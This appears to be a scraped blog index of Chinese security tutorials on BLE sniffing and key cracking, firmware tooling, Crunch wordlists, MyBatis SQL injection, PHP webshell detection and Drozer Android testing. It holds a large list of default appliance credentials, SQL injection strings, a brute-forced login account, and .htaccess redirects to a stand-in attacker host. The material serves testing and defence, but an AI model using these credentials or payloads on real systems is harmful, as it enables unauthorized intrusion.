/dev/ttyUSB0 set speed 115200 set carrier-watch off set handshake none set flow-control none robust set file type bin set file name lit set rec pack 1000 set send pack 1000 set window 5 b. 编译安装12345678wget https://kismetwireless.net/code/kismet-2020-09-R1.tar.xztar xf kismet-2020-09-R1.tar.xzcd kismet-2020-09-R1ln -s ../ubertooth-2015-09-R2/host/kismet/plugin-ubertooth ../configuremake &amp;&amp; make pluginssudo make suidinstallsudo make plugins-install 报错安装： 12345sudo apt-get install ncurses-devsudo apt-get install libpcap-devsudo apt-get install libz-devsudo apt-get install libmicrohttpd-devsudo apt-get install libsqlite3-dev 找到kismet的配置文件kismet.conf ，把”pcapbtbb”加入到kismet.conf的logtypes= 里边 6. 安装BLE解密工具crackle1234git clone https://github.com/mikeryan/crackle.gitcd cracklemakesudo make install 0x02 嗅探扫描1. Spectool1sudo apt install spectools a. spectool_curses b. spectool_gtk扫描附近信号在频谱上显示 c. spectool_rawRAW中文的解释是“原材料”或“未经过处理的东西”，这里猜测是显示设备捕获到的未经处理的信号数据： d. spectool_net将Ubertooth One作为一台“硬件服务器”，并监听TCP：30569端口，局域网内任何可以跟主机建立通信的PC可通过Ubertoothe主机IP+30569共享设备。连接方式：在另外一台主机终端上执行：spectool_gtk —&gt;选择Open Network Device —&gt;输入ip、端口 2. Hcitoolhcitool –help 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849hcitool - HCI Tool ver 5.48Usage: hcitool [options] &lt;command&gt; [command parameters]Options: --help Display help -i dev HCI deviceCommands: dev Display local devices inq Inquire remote devices scan Scan for remote devices name Get name from remote device info Get information from remote device spinq Start periodic inquiry epinq Exit periodic inquiry cmd Submit arbitrary HCI commands con Display active connections cc Create connection to remote device dc Disconnect from remote device sr Switch master/slave role cpt Change connection packet type rssi Display connection RSSI lq Display link quality tpl Display transmit power level afh Display AFH channel map lp Set/display link policy settings lst Set/display link supervision timeout auth Request authentication enc Set connection encryption key Change connection link key clkoff Read clock offset clock Read local or remote clock lescan Start LE scan leinfo Get LE remote information lewladd Add device to LE White List lewlrm Remove device from LE White List lewlsz Read size of LE White List lewlclr Clear LE White List lerladd Add device to LE Resolving List lerlrm Remove device from LE Resolving List lerlclr Clear LE Resolving List lerlsz Read size of LE Resolving List lerlon Enable LE Address Resolution lerloff Disable LE Address Resolution lecc Create a LE Connection ledc Disconnect a LE Connection lecup LE Connection UpdateFor more information on the usage of each command use: hcitool &lt;command&gt; --help hcitool scan :扫描附近蓝牙设备 hcitool lescan :扫描附近低功耗蓝牙设备 3. Gatttool gatttool -h 123456789101112131415161718Usage: gatttool [OPTION?]Help Options: -h, --help Show help options --help-all Show all help options --help-gatt Show all GATT commands --help-params Show all Primary Services/Characteristics arguments --help-char-read-write Show all Characteristics Value/Descriptor Read/Write argumentsApplication Options: -i, --adapter=hciX Specify local adapter interface -b, --device=MAC Specify remote Bluetooth address -t, --addr-type=[public | random] Set LE address type. Default: public -m, --mtu=MTU Specify the MTU size -p, --psm=PSM Specify the PSM for GATT/ATT over BR/EDR -l, --sec-level=[low | medium | high] Set security level. Default: low -I, --interactive Use interactive mode gatttool -b EC:F3:42:B2:DF:24 -I 4. Ubertooth-scan -ssudo apt install ubertooth 5. Ubertooth-bleubertooth-btle - passive Bluetooth Low Energy monitoring Usage: -h this help Major modes: -f follow connections -p promiscuous: sniff active connections -a[address] get/set access address (example: -a8e89bed6) -s&lt;address&gt; faux slave mode, using MAC addr (example: -s22:44:66:88:aa:cc) -t&lt;address&gt; set connection following target (example: -t22:44:66:88:aa:cc) Interference (use with -f or -p): -i interfere with one connection and return to idle -I interfere continuously Data source: -U&lt;0-7&gt; set ubertooth device to use Misc: -r&lt;filename&gt; capture packets to PCAPNG file -q&lt;filename&gt; capture packets to PCAP file (DLT_BLUETOOTH_LE_LL_WITH_PHDR) -c&lt;filename&gt; capture packets to PCAP file (DLT_PPI) -A&lt;index&gt; advertising channel index (default 37) -v[01] verify CRC mode, get status or enable/disable -x&lt;n&gt; allow n access address offenses (default 32) If an input file is not specified, an Ubertooth device is used for live capture. In get/set mode no capture occurs. ubertooth-btle -f -c test.pcap抓包&amp;保存到本地 使用这条命令我们可以把设备捕获到的数据包保存到本地，完成后可导入wireshark进行数据包、协议分析。 wireshark导入嗅探到的蓝牙数据包需要处理一下才能正常查看，不然无法正常分析数据： Edit → Preferences → Protocols → DLT_USER → Edit → New 在payload protocol中输入btle 使用规则过滤数据包：参考Capturing BLE in Wireshark 1btle.data_header.length &gt; 0 || btle.advertising_header.pdu_type == 0x05 6. crackle如果捕获到足够的数据包尤其是btsmp，抓到包之后我们最关心的问题是我们有没有抓到的足够的包来破解tk。所以在wireshark中你可以在filter处加上btsmp，确保抓到了我们需要的6个包。，那接下来便可以用crackle来破解tk和ltk： 做到这个点尝试了身边的一些设备的连接没抓到大量包没有至少6个btsmp之后实践中碰到补足图片 1crackle -i &lt;file.pcap&gt; 123从上图中我们可以看到我们不但破解了tk，还利用利用tk和其它一些数据成功的还原出了ltk。接下来我们再来试试利用获取的ltk来破解其他的加密包。假设我们在配对过程中已经拿到了ltk=7f62c053f104a5bbe68b1d896a2ed49c 解密数据包，并把解密后的包另存： 1234crackle -i &lt;file.pcap&gt; -o &lt;output.pcap&gt;crackle -i &lt;file.pcap&gt; -o &lt;out.pcap&gt; -l &lt;ltk&gt;crackle -l 7f62c053f104a5bbe68b1d896a2ed49c -i test44.pcap -o test66.pcap 可以看到成功破解了7个包 0x03 解决方案1. 使用OOB123456789101112[email protected]:~/Desktop# crackle -i heart.pcap Warning: No output file specified. Won't decrypt any packets.Warning: found multiple connects, only using the latest oneWarning: found multiple LL_ENC_REQ, only using latest oneWarning: found multiple connects, only using the latest oneWarning: found multiple pairing requests, only using the latest oneWarning: found multiple connects, only using the latest oneWarning: found multiple pairing requests, only using the latest oneWarning: already saw two random values, skippingWarning: found multiple LL_ENC_REQ, only using latest oneTK not found, the connection is probably using OOB pairingSorry d00d :( 2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）0x04 参考：http://www.vuln.cn/6083 https://blog.csdn.net/charmve/article/details/107170250 路人甲@乌云drops:Bluetooth Low Energy 嗅探 疯狗@乌云drops：物联网安全拔“牙”实战——低功耗蓝牙（BLE）初探 https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark","link":"/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/"},{"title":"固件环境搭建","text":"环境搭建https://gitee.com/h4lo1/HatLab_Tools_Library binwalk：1234567git clone https://github.com/devttys0/binwalk.gitcd binwalksudo ./deps.shsudo python ./setup.py installsudo apt-get install python-lzmasudo -H pip install git+https://github.com/ahupp/python-magicsudo -H pip install git+https://github.com/sviehb/jefferson firmadyne：123456git clone https://github.com/firmadyne/firmadynecd firmadyne/ &amp;&amp; sudo download.shsudo -u postgres createuser -P firmadyne password: firmadyne sudo -u postgres createdb -O firmadyne firmwaresudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema qemu-2.4.0:12345wget https://download.qemu.org/qemu-2.4.0.tar.xztar xvf qemu-2.4.0.tar.xz &amp;&amp; cd qemu-2.4.0/./configure --target-list=arm-softmmu,mips-softmmu,mipsel-softmmu --audio-drv-list=alsa,pamake -j8sudo make install gdb-multiarch:1sudo apt-get install gdb-multiarch gdbserver:12https://github.com/hugsy/gdb-statichttps://github.com/akpotter/embedded-toolkit IDA 脚本12https://github.com/giantbranch/mipsAudithttps://github.com/tigerpuma/idatool-devttys0- Ghidra1https://www.nsa.gov/resources/everyone/ghidra/ cutter1https://github.com/radareorg/cutter qemu_system_arm1https://people.debian.org/~aurel32/qemu/armhf/ firmwalker1https://github.com/craigz28/firmwalker","link":"/2020/09/12/IOT/%E5%9B%BA%E4%BB%B6%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"默认设备密码","text":"设备默认密码 设备 默认账号 默认密码 深信服产品 sangfor sangfor/sangfor@2018/sangfor@2019 深信服科技AD sangfor dlanrecover 深信服负载均衡 AD 3.6 admin admin 深信服WAC（WNS V2.6） admin admin 深信服v-p-n Admin Admin 深信服-ipsec-V-P-N（SSL 5.5） Admin Admin 深信服AC6.0 admin admin SANGFOR防火墙 admin sangfor 深信服AF（NGAF V2.2） admin sangfor 深信服NGAF下一代应用防火墙（NGAF V4.3） admin admin 深信服AD3.9 admin admin 深信服上网行为管理设备数据中心 Admin 密码为空 SANGFOR_AD_v5.1 admin admin 网御漏洞扫描系统 leadsec leadsec 天闻入侵检测和管理系统V7.0 Admin venus70 Audit venus70 adm venus70 天闻入侵检测和管理系统V6.0 Admin venus60 Audit venus60 adm venus60 网御WAF集中控制中心（V3.0R5.0） admin leadsec.waf audit leadsec.waf adm leadsec.waf 联想网御 administrator administrator 网御事件服务器 admin admin123 联想网御入侵检测系统v3.2.72.0 adm leadsec32 admin leadsec32 联想网御防火墙PowerV administrator administrator 联想网御入侵检测系统 lenovo default 网络卫视入侵检测系统 admin talent 联想网御入侵检测系统IDS root 111111 admin admin123 科来网络回溯分析系统 csadmin colasoft 中控考勤机web3.0 administrator 123456 H3C IMC admin admin H3C SecPath系列 admin admin H3C S520-SI test 123 H3C 智能管理中心 admin admin H3C RE3100 admin adminer3100 H3C RE3200 admin adminer3200 H3C RE3260 admin adminer3260 H3C admin adminer admin admin admin h3capadmin h3c h3c 360天擎 admin admin 网神防火墙 firewall firewall 天融信防火墙NGFW4000 superman talent 黑盾防火墙 admin admin rule abc123 audit abc123 华为防火墙 telnetuser telnetpwd ftpuser ftppwd 方正防火墙 admin admin 飞塔防火墙 admin 密码为空 Juniper_SSG_5防火墙 netscreen netscreen 中新金盾硬件防火墙 admin 123 kill防火墙（冠群金辰） admin sys123 天清汉马USG防火墙 admin venus.fw Audit venus.audit useradmin venus.user 阿姆瑞特防火墙 admin manager 山石网科 hillstone hillstone 绿盟安全审计系统 weboper weboper webaudit webaudit conadmin conadmin admin admin shell shell 绿盟产品 nsfocus123 TopAudit日志审计系统 superman talent LogBase日志管理综合审计系统 admin safetybase 网神SecFox韵味安全管理与审计系统 admin !1fw@2soc#3v-p-n 天融信数据库审计系统 superman telent Hillstone安全审计平台 hillstone hillstone 网康日志中心 ns25000 ns25000 网络安全审计系统（中科新业） admin 123456 天玥网络安全审计系统 Admin cyberaudit 明御WEB应用防火墙 admin admin admin adminadmin 明御攻防实验室平台 root 123456 明御安全网关 admin adminadmin 明御运维审计与册风险控制系统 admin 1q2w3e system 1q2w3e4r auditor 1q2w3e4r operator 1q2w3e4r 明御网站卫士 sysmanager sysmanager888 亿邮邮件网关 eyouuser eyou_admin eyougw admin@(eyou) admin +ccccc admin cyouadmin Websense邮件安全网关 administrator admin 梭子鱼邮件存储网关 admin admin 天行光闸 super TopFGAP123 天行光闸 admin Topwalkadmin123 天融信防火墙 superman talent!23 联想网御防火墙 admin eadsec@7766/administrator/bane@7766 深信服防火墙 admin admin 启明星辰 admin bane@7766 admin@123 juniper netscreen netscreen Cisco admin cisco Huawei admin Admin@123 深信服VPN 51111端口 delanrecover 华为VPN root mduadmin 华为防火墙 admin Admin@123 EudemonJuniper防火墙 netscreen netscreen 迪普 admin admin_default 安恒的明御防火墙 admin adminadmin 某堡垒机 shterm shterm 天融信的VPN test 123456 奇安信所有产品 Admin !1ws","link":"/2020/09/12/IOT/%E9%BB%98%E8%AE%A4%E8%AE%BE%E5%A4%87%E5%AF%86%E7%A0%81/"},{"title":"Linux下的字典生成工具Crunch，创造自己的专属字典","text":"![password.jpg](Linux下的字典生成工具Crunch，创造自己的专属字典/15256173123056.jpg!small Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。由其在渗透测试需要爆破的时候，字典的编排等直接影响到我们的爆破速度，对整个渗透测试流程起着十分重要的作用。 0x00 安装1address : https://sourceforge.net/projects/crunch-wordlist/ Crunch为kali自带工具之一在kali环境下进行，文中提及的所有命令均可以在kali下直接运行。 0x01 使用语法和参数1crunch &lt;min&gt; &lt;max&gt; [options] 参数详解 1234567891011121314151617181920min 设定最小字符串长度（必选）max 设定最大字符串长度（必选）oprions-b 指定文件输出的大小，避免字典文件过大 -c 指定文件输出的行数，即包含密码的个数-d 限制相同元素出现的次数-e 定义停止字符，即到该字符串就停止生成-f 调用库文件（/etc/share/crunch/charset.lst）-i 改变输出格式，即aaa,aab -&gt; aaa,baa-I 通常与-t联合使用，表明该字符为实义字符-m 通常与-p搭配-o 将密码保存到指定文件-p 指定元素以组合的方式进行-q 读取密码文件，即读取pass.txt-r 定义重某一字符串重新开始-s 指定一个开始的字符，即从自己定义的密码xxxx开始-t 指定密码输出的格式-u 禁止打印百分比（必须为最后一个选项）-z 压缩生成的字典文件，支持gzip,bzip2,lzma,7z 特殊字符 1234% 代表数字^ 代表特殊符号@ 代表小写字母, 代表大写字符 0x02 实用案例（1）生成一个字典文件，用自己指定的字符（默认为26个小写字母为元素的所有组合） 1crunch 1 3 123 （2）若字典中需要空格，;等用双引号来表示 1crunch 3 3 &quot;ab &quot; （3）生成几个元素的组合（可以用于社工中收集的信息） 1crunch 4 4 -p zhangsan 2018 0101 .. （4）生成指定的字符串（比如生成编号，手机号等） 1crunch 10 10 -t 201800%%%% （5）多种组合 生成3个元素的组合，前三位为定义的字符串 1crunch 3 3 -t d@% -p aaa bbb （6）通过-l参数来使@,%^等特殊字符输出 1crunch 7 7 -t p@ss,%^ -l a@aaaaa （7）-o参数也可使用&gt;&gt;来简化 1crunch 4 4 -d 2@ -t @@@% &gt;&gt; test.txt 0x03 调用密码库1/usr/share/crunch/charset.lst 特殊字符 123numeric 表示0123456789Lalpha 表示26位小写字母Ualpha 表示26位大写字母 实例：调用密码库 charset.lst中的 hex-upper项目字符，生成4位密码，其中格式为@ + hex-upper +% +% 1crunch 4 4 -f charset.lst hex-upper -t @@%% -l @xdd 0x04 总结你也可以根据自己需要的字符自己编写密码库文件来完成对特殊字典的编写，来创造自己的专属字典。","link":"/2018/05/15/WEB/Linux%E4%B8%8B%E7%9A%84%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Crunch%EF%BC%8C%E5%88%9B%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9E%E5%AD%97%E5%85%B8/"},{"title":"mybatis框架sql注入针对性渗透测试与修复","text":"mybatis框架sql注入针对性渗透测试与修复 0X00背景 在国内，政府、国企、央企等重点单位的内网应用系统基本都以JAVA为主。由于重点单位对于应用系统的性能、功能、扩展性等各方面及厂商开发快速性要求，SSM框架成为系统架构首选。这种情况下，有必要对梳理SSM框架相关的渗透测试入侵点。本文将针对Mybatis框架易发生注入的点做简单讨论。 0X01 Mybatis概述 Mybatis是支持定制化的SQL、存储过程以及高级映射的优秀的持久层框架。 避免了几乎所有的JDBC代码，手动设置参数以及获取结果集的操作。可以对配置和原生的Map使用简单的XML或注解，将接口和java的POJOs映射成数据库中的记录，极大提高了开发效率。 因为框架避免了用户直接进行SQL语句的拼接，以至于部分开发或安全同学认为只要使用了Mybatis框架，就可以杜绝SQL注入。显然这是不可能的，须知没有免费的午餐，惰性永存，作为安全从业者的我们就是在对抗人性的缺点。 接下来，我们首先了解Mybatis在配置SQL语句时候的两种描述参数的方式 一种为：#{} 一种为：${} 比如 这个语句selectPerson,接受一个int(或integer)类型的参数，并返回一个hashmap类型的对象。 注意这里的参数符号是：#{id} 该情况下，Mybatis会创建一个预处理语句参数，通过JDBC，这样的一个参数在SQL中会由一个“？”来标识，并传递到一个新的预处理语句当中，就像这样： 那么用$代替#来描述参数会发生什么？ 这种情况下，框架会直接把变量拼接到SQL语句当中，不会做其他的处理。就相当于直接字符串拼接SQL语句。 综上：使用#格式的语法，框架会创建预处理语句属性并安全地设置值，这样做安全，迅速，通常也是首选做法。然而有时只是想直接在SQL语句中插入一个不改变的字符串。比如，像ORDER BY,可以这样来使用: ORDER BY S{columnName}。这里MyBatis不会修改或转义字符串。但显然，这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的SQL注入攻击， 0X03 误用场景 通过上部分的讨论，我们知道使用#符号，Mybatis会进行预编译来处理参数，这样可以有效的避免SQL注入。 那么假如所有人都正确使用了#，也就不存在安全问题了。事实却恰恰相反，总有错误的用法，所以咱们才不会失业。 在程序中，如order by字段、表名等，是无法使用预编译语句的，在like参数、in参数、order by这种尝试用拼接逻辑的场景下，开发同学总会给系统留下一点彩蛋。所以在实际测试当中，能聚焦这方面，有针对性的进行漏洞的挖掘，才可以达到事倍功半的效果。 1、 like参数注入 错误写法示例： 正确写法 对于Oracle可以通过’%’||’#param#’||’%’避免； 对于MySQL可以通过CONCAT(‘%’,#param#,’%’)避免； 对于MSSQL中通过’%’+#param#+’% 。 2 、in参数的SQL注入 错误写法示例： 正确写法 3、Order by SQL注入 因为预编译机制只能处理查询参数，此处显然不是查询参数，是一种错误的写法，因此order by位置的参数需要开发人员自己处理。所以只能使用$去拼接： 针对这种情况要在代码中做过滤、使用转义等方式处理字符，避免改变SQL逻辑。 其实也可以在xml中处理，用if去判断，这样就显得比较硬编码，sql语句会增加较多，显得臃肿，不便阅读。 通过上面的分析，我们了解到使用了mybatis框架容易误用的地方，可以有针对性的对部分功能展开渗透测试。 0X04 真实案列 某单位系统登陆页面未做验证码验证，进一步验证发现未对失败次数做限制，存在可爆破漏洞。同时是服务单位客户系统，存在弱密码可能极大。对于弱密码是有着永远说不完的话题，正好可以利用一波。 通过前期的信息收集，针对性制作弱密码字典，开始爆破行动。 反复尝试了几次，发现账户、密码正确，成功登陆系统。 接下来针对系统作进一步的渗透测试，因为有mybatis框架，我们只需要针对性测试上文总结的几处场景： 系统存在多处查询功能，查询用户名，会用like方式，猜测此处存在sql注入。 抓包手动测试： ‘ or ‘1’=‘0 ‘ and ‘1’=‘1 返回结果明显不同，存在sql注入。 直接测模糊查询功能模块，得到多枚SQL注入。 Sqlmap结果，Oracle数据库，3个库。 通过源代码进行修复 我们前面提到like参数场景下的修复方式，如上图在LIKE后面跟 ‘%’||#{字段名}||’%’即可修复。 作为小白一次完整的mybatis框架sql注入针对性渗透测试与修复结束，望大佬们勿喷，请指点。","link":"/2020/09/13/WEB/mybatis%E6%A1%86%E6%9E%B6sql%E6%B3%A8%E5%85%A5%E9%92%88%E5%AF%B9%E6%80%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BF%AE%E5%A4%8D/"},{"title":"检测PHP网站是否被攻破的方法","text":"0x01 查看访问日志 查看是否有文件上传操作 IPREMOVED - - [01/Mar/2013:06:16:48 -0600] &quot;POST/uploads/monthly_10_2012/view.php HTTP/1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla/5.0&quot; IPREMOVED - - [01/Mar/2013:06:12:58 -0600] &quot;POST/public/style_images/master/profile/blog.php HTTP/1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla/5.0&quot; nginx默认记录的日志格式为： access_log logs/access.log 或 access_log logs/access.log combined; nginx默认记录日志的位置为： nginx安装目录/log/ iis默认记录日志的位置为： %inetpub%\\logs\\LogFiles apache默认记录日志的位置为： %apache%\\logs\\error.log weblogic默认记录日志的位置为： %base_domain%\\servers\\AdminServer\\logs\\ 0x02 查找还有恶意的php代码文件 2.1查找最近发生变化的php文件 find . -type f -name '*.php' -mtime -7-type表示搜索一般文件，-mtime -7表示7*24小时内修改的文件 结果可能如下： ./uploads/monthly_04_2008/index.php ./uploads/monthly_10_2008/index.php ./uploads/monthly_08_2009/template.php ./uploads/monthly_02_2013/index.php 2.2 查找文件中是否存在疑似代码 find . -type f -name '*.php' | xargs grep -l &quot;eval *(&quot; --color *( 代表任意个空格 find . -type f -name '*.php' | xargs grep -l &quot;base64_decode *(&quot; --color find . -type f -name '*.php' | xargs grep -l &quot;gzinflate *(&quot; --color find . -type f -name '*.php' | xargs grep -l &quot;eval *(str_rot13 *(base64_decode *(&quot; --color 注解：很多命令不支持管道传递参数，而实际上又需要这样，所以就用了xargs命令，这个命令可以用来管道传递参数；grep -l表示只包含某个字符串的文件名，如果去掉-l则会显示匹配特定字符串的行内容 几个特殊字符串的意义: eval()**把字符串按照php代码来执行，是最常见的php一句话木马** base64_decode() 将字符串base64解码，攻击的时候payload是base64编码，则这个函数就有用武之地了 gzinflate() 将字符串解压缩处理，攻击的时候payload用gzdeflate压缩之后，使用这个函数进行解压缩 str_rot13() 对字符串进行rot13编码 也可以使用正则表达式来搜索文件，查找可以代码： find . -type f -name '*php' | xargs egrep -i &quot;(mail|fsockopen|pfsockopen|stream\\_socket\\_client|exec|system|passthru|eval|base64_decode) *(&quot; 下面解释webshell常用的函数： mail()：**可用来向网站用户发送垃圾邮件** fsockopen()**:打开一个网络连接或者一个unix套接字连接，可用于payload发送远程请求** pfsockopen()**:和fsockopen()作用类似** stream_socket_client()**:建立一个远程连接，** 例子如下： &lt;?php $fp = stream_socket_client(&quot;tcp://www.example.com:80&quot;, $errno, $errstr, 30); if (!$fp) { echo &quot;$errstr ($errno)&lt;br /&gt;\\n&quot;; } else { fwrite($fp, &quot;GET / HTTP/1.0\\r\\nHost: www.example.com\\r\\nAccept: */*\\r\\n\\r\\n&quot;); while (!feof($fp)) { echo fgets($fp, 1024); } fclose($fp); } ?&gt; exec()**:命令执行函数** system()**:同**exec() passthru()**:同**exec() preg_replace()正则表达式由修饰符”e”修饰的时候，替换字符串在替换之前需要按照php代码执行，这种情况也需要考虑到，这种情况可采用这种以下扫搜： find . -type f -name '*.php' | xargs egrep -i &quot;preg_replace *\\((['|\\&quot;])(.).*\\2[a-z]*e[^\\1]*\\1 *,&quot; --color 0x03 比较代码文件 这种情况需要有一份干净的代码，这份代码和正在使用的代码进行比较。例如 diff -r wordpress-clean/ wordpress-compromised/ -x wp-content 上面的例子是比较wordpress-clean/ 和wordpress-comprised/两个目录，并且目录里面的wp-content/子目录不比较 0x04 搜寻可写的目录 看看这个目录里面是否有可疑的文件，如下脚本查找权限为777的目录是否存在php文件 search_dir=$(pwd) writable_dirs=$(find $search_dir -type d -perm 0777) for dir in $writable_dirs do #echo %dir find $dir -type -f -name '*.php' done 黑客经常在jpg中插入php代码，因此在查询这些目录的时候也要查询jpg文件： find wp-content/uploads -type f -iname '*.jpg' | xargs grep -i php 注意：-iname 表示文件名不区分大小写 grep -i 也表示不区分大小写 0x05 检测iframe标签 黑客经常做的是嵌入iframe标签，因此可以查看网页的源代码，并且搜索其中是否存在iframe标签，可使用如下命令： grep -i '&lt;iframe' mywebsite.txt 对于动态生成的页面，可使用firefox的Live HTTP Headers插件，下载到源码之后再查找是否存在iframe标签 0x06 查找数据库中是否存在敏感字符串 包括%base64_%、%eval(% 等上面提到的一些关键字 0x07 检查.htacess文件 是否包含了auto_prepend_file和auto_append_file，使用如下命令 find . -type f -name '\\.htaccess' | xargs grep -i auto_prepend_file find . -type f -name '\\.htaccess' | xargs grep -i auto_append_file 注释：.htacess （htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。） uto_prepend_file**的作用是加载当前脚本文件之前，先加载的php脚本 auto_append_file的作用是加载当前脚本文件之后，再加载的php脚本。黑客如果这么修改了.htaccess文件，那么可以在访问.htaccess目录的php脚本时，加载上自己想要加载的恶意脚本 .** htaccess文件还可以被用来把访问网站的流量劫持到黑客的网站 RewriteCond %{HTTP_USER_AGENT}^.*Baiduspider.*$ Rewriterule ^(.*)$ http://www.hacker.com/muma.php [R=301] 将baidu爬虫的访问重定向到黑客的网站(包含HTTP_USER_AGENT和http关键字) RewriteCond %{HTTP_REFERER} ^.*baidu.com.*$ Rewriterule ^(.*)$ http://www.hacker.com/muma.php [R=301] 将来自baidu搜索引擎的流量重定向到黑客的网站(包含HTTP_REFERER和http关键字) 为了查看网站是否被.htaccess修改导致流量劫持，可以在搜索.htaccess文件的时候采用如下命令： find . -type f -name '\\.htaccess' | xargs grep -i http; find . -type f -name '\\.htaccess' | xargs grep -i HTTP_USER_AGENT; find . -type f -name '\\.htaccess' | xargs grep -i HTTP_REFERER","link":"/2020/09/13/WEB/%E6%A3%80%E6%B5%8BPHP%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E8%A2%AB%E6%94%BB%E7%A0%B4%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"Android安全测试框架Drozer(基础篇)","text":"0x00 Drozer 简介Drozer是MWR Labs开发的一款Android安全测试框架。是目前最好的Android安全测试工具之一。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”在Web世界已经有了许多安全测试工具了,我们只需要给出一个目标,这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同,Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试,用户在自己的工作站上输入命令,Drozer会将命令发送到Android设备上的代理程序执行。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。 0x01 安装和启动1.安装第一步：从 http://mwr.to/drozer 下载Drozer (Windows Installer) 第二步：在 Android 设备中安装 agent.apk 1adb install agent.apk 2.启动第一步：在 PC 上使用 adb 进行端口转发，转发到 Drozer使用的端口 31415 1adb forward tcp:31415 tcp:31415 第二步：在 Android 设备上开启 Drozer Agent 选择 embedded server-enable 第三步：在 PC 上开启 Drozer console 1drozer console connect 第四步 list命令验证安装（列出所有功能模块） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768app.activity.info Gets information about exported activities. app.activity.start Start an Activity app.broadcast.info Get information about broadcast receivers app.broadcast.send Send broadcast using an intent app.broadcast.sniff Register a broadcast receiver that can sniff particular intents app.package.attacksurface Get attack surface of package app.package.backup Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP) app.package.debuggable Find debuggable packages app.package.info Get information about installed packages app.package.launchintent Get launch intent of package app.package.list List Packages app.package.manifest Get AndroidManifest.xml of package app.package.native Find Native libraries embedded in the application. app.package.shareduid Look for packages with shared UIDs app.provider.columns List columns in content provider app.provider.delete Delete from a content provider app.provider.download Download a file from a content provider that supports files app.provider.finduri Find referenced content URIs in a package app.provider.info Get information about exported content providers app.provider.insert Insert into a Content Provider app.provider.query Query a content provider app.provider.read Read from a content provider that supports files app.provider.update Update a record in a content provider app.service.info Get information about exported services app.service.send Send a Message to a service, and display the reply app.service.start Start Service app.service.stop Stop Service auxiliary.webcontentresolver Start a web service interface to content providers. exploit.jdwp.check Open @jdwp-control and see which apps connect exploit.pilfer.general.apnprovider Reads APN content provider exploit.pilfer.general.settingsprovider Reads Settings content provider information.datetime Print Date/Time information.deviceinfo Get verbose device information information.permissions Get a list of all permissions used by packages on the device scanner.activity.browsable Get all BROWSABLE activities that can be invoked from the web browser scanner.misc.native Find native components included in packages scanner.misc.readablefiles Find world-readable files in the given folder scanner.misc.secretcodes Search for secret codes that can be used from the dialer scanner.misc.sflagbinaries Find suid/sgid binaries in the given folder (default is /system). scanner.misc.writablefiles Find world-writable files in the given folder scanner.provider.finduris Search for content providers that can be queried from our context. scanner.provider.injection Test content providers for SQL injection vulnerabilities. scanner.provider.sqltables Find tables accessible through SQL injection vulnerabilities. scanner.provider.traversal Test content providers for basic directory traversal vulnerabilities. shell.exec Execute a single Linux command. shell.send Send an ASH shell to a remote listener. shell.start Enter into an interactive Linux shell. tools.file.download Download a File tools.file.md5sum Get md5 Checksum of file tools.file.size Get size of file tools.file.upload Upload a File tools.setup.busybox Install Busybox. tools.setup.minimalsu Prepare 'minimal-su' binary installation on the device. 0x03 测试步骤1.获取包名1dz&gt; run app.package.list -f sieve com.mwr.example.sieve 2.获取应用的基本信息1run app.package.info -a com.mwr.example.sieve 3.确定攻击面1run app.package.attacksurface com.mwr.example.sieve 4.Activity（ 1 ）获取 activity 信息1run app.activity.info -a com.mwr.example.sieve （ 2 ）启动 activity1run app.activity.start --component com.mwr.example.sieve dz&gt; help app.activity.start usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY] [--component PACKAGE COMPONENT] [--data-uri DATA_URI] [--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]] [--mimetype MIMETYPE] 5.Content Provider（ 1 ）获取 Content Provider 信息1run app.provider.info -a com.mwr.example.sieve （2）Content Providers （数据泄露）先获取所有可以访问的 Uri ： 1run scanner.provider.finduris -a com.mwr.example.sieve 获取各个 Uri 的数据： 1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical 查询到数据说明存在漏洞 （3）Content Providers （ SQL 注入）1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type='table';--&quot; 报错则说明存在 SQL 注入。 列出所有表： 1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type='table';--&quot; 获取某个表（如 Key ）中的数据： 1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot; （ 4 ）同时检测 SQL 注入和目录遍历1run scanner.provider.injection -a com.mwr.example.sieve run scanner.provider.traversal -a com.mwr.example.sieve 6.Service（1）获取 service 详情1run app.service.info -a com.mwr.example.sieve 7. 其它模块shell.start 在设备上开启一个交互shell tools.file.upload / tools.file.download 上传/下载文件到设备 tools.setup.busybox / tools.setup.minimalsu 